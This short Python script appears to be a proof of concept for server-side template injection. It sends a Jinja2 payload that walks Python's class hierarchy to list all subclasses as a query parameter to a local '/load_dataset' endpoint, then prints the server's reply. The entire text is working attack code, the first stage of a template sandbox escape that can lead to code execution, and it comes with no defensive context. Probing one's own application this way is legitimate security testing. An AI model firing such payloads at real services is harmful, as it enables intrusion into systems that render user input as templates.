import requests
payload = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
resp = requests.get("http://127.0.0.1:5000/load_dataset",
                    params={"config": payload})
print("Server response (truncated):")
print(resp.text[:200])